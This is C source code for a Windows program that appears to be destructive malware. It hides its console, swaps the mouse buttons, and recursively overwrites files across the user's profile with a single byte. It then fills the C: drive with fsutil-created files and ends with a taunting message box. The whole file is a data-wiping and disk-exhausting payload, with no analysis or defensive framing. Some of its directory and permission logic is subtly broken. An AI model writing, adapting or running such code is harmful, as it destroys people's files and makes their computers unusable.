#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#define SUS "\x90"
#define ULONG unsigned long long
#define PU PULARGE_INTEGER
#define SETCPOS \
    SetCursorPos(INT_MAX,INT_MAX)
    //0x7fffffff

const int S[2]={256,0x8a};
void overwrite(const char *filename);
void flame(char *basepath);
void filldisk();
ULONG freespace();
int recognize_dir(char *file);
int checkperms(char *path);

int main(){
    char *sus=getenv("USERPROFILE");
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    system("rundll32.exe user32.dll,SwapMouseButton");
    flame(sus);
    filldisk();
    MessageBox(NULL,"\nWe love you.\n\n:3\n\n",__FILE__,1);
    return EXIT_SUCCESS;
}

void overwrite(const char *filename){
    SETCPOS;
    FILE *file=fopen(filename,"wb");
    fwrite(SUS,1,sizeof(SUS),file);
    fclose(file);
}

void flame(char *basepath){
    if(checkperms(basepath)){
        DIR *ls;
        char *file, *deldir;
        struct dirent *dir;
        chdir(basepath);
        ls=opendir(".");
        if(ls){
            while((dir=readdir(ls))!=NULL){
                file=dir->d_name;   
                if(strcmp(file,".")+strcmp(file,"..")+strcmp(file,"AppData")==3&&!recognize_dir(file)){
                    SETCPOS;
                    char dirpath[S[0]];
                    sprintf(dirpath,"%s\\%s",_getcwd(NULL,0),file);
                    flame(dirpath); //i love recursionz
                    chdir("..");
                } else overwrite(file);
            }
            closedir(ls);
        }
    }
    SETCPOS;
}

void filldisk(){
    ULONG a = (!freespace()?S[1]:freespace());
    char *sussyuwu = getenv("APPDATA");
    char napoli[0x4e];
    if(sussyuwu!=NULL&&!chdir(sussyuwu)&&checkperms(sussyuwu)&&a){
        chdir(sussyuwu);
        for(int i=0; i<S[1]; i++){
            sprintf(napoli,"fsutil file createnew droplet_%d %llu",i+1,a/S[1]);
            system(napoli);
        }
    }
}

ULONG freespace(){
    ULONG ab=0;
    if(GetDiskFreeSpaceExA("C:\\",(PU)&ab,(PU)0,(PU)0)) return ab;
    else return 0;
}

int recognize_dir(char *file){
    struct stat isdir;
    stat(file, &isdir);
    return S_ISREG(isdir.st_mode);
}

int checkperms(char *path){
    DWORD sperm=GetFileAttributesA(path);
    if(sperm==INVALID_FILE_ATTRIBUTES||FILE_ATTRIBUTE_READONLY) return -1;
    else return 1; //FILE_ATTRIBUTE_DIRECTORY
}
